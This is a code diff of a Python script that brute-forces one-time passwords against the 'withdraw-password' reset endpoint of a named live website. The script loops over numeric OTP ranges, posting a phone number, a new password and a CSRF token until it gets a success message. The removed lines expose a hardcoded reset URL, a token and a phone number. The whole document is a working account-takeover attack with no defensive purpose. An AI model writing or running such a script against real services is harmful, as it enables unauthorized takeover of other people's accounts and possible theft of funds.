@@ -1,42 +1,52 @@
 import requests
 import re
+import sys
+sys.path.append('/WB')
+import config
 
 def forgot_password(mobile, otp, password, cnf_password):
+    data = {
+       "mobile": mobile,
+        "otp": otp,
+        "password": password,
+        "password_confirmation": cnf_password,
+        "_token": config.TOKEN
+    }
 
-#Change URL by inspecting the code or send dummy request and get url in network tab
 
-  url = "https://88panel.com/withdraw-password-client/reset/863891/kUH4LkBdmJxbpBrHd3b0463a4d5cee4d1d7770e5653d8139"
-  data = {
-    "mobile": mobile,
-    "otp": otp,
-    "password": password,
-    "password_confirmation": cnf_password,
-    "_token": "j74yR2sZDRjhRmtL9unz8ZPSJlCFtVnXKtA1Wx8Y"
-  }
 
-  response = requests.post(url, data=data)
 
-  if response.status_code == 200:
-    if re.search(r"success", response.text):
-        print("Password reset successful")
-        return True
+    response = requests.post(config.WITHDRAW_URL, data=data)
+
+    if response.status_code == 200:
+        if re.search(r"Password reset successfully.", response.text):
+            print(response.text , otp)
+            return 1
+        elif re.search(r"OTP Expired, Please Create new OTP!", response.text):
+            print("Error: " , otp , "otp expired create new one.")
+            return 3
+        else:
+            print("Error:", otp, response.text)
+            return 2
     else:
-        print("Error:" , otp, response.text)
-  else:
-    print("Error:", response.status_code)
-  return False
-
+        print("Error:", response.status_code , response.text)
+        return 3
 
 if __name__ == "__main__":
-  # Example usage
-  mobile = "8078644957"
-  password = "QWERTY@12345!@#$%"
-  cnf_password = "QWERTY@12345!@#$%"
-  otp_range = range(2000, 3000)
+    session = requests.Session()
+    mobile = config.MOBILE_NUMBER
+    password = config.PASSWORD
+    cnf_password = config.CNF_PASSWORD
+    otp = config.R3
 
-  for otp in otp_range:
-    try:
-      if forgot_password(mobile, otp, password, cnf_password):
-        break
-    except Exception as e:
-        print(f"Error for OTP {otp}: {e}")
+    while otp <= config.R4:
+        try:
+            result = forgot_password(mobile, otp, password, cnf_password)
+            if result == 1:
+                break
+            elif result == 2:
+                otp += 1
+            else:
+                continue
+        except Exception as e:
+            print(f"Error for OTP {otp}: {e}")
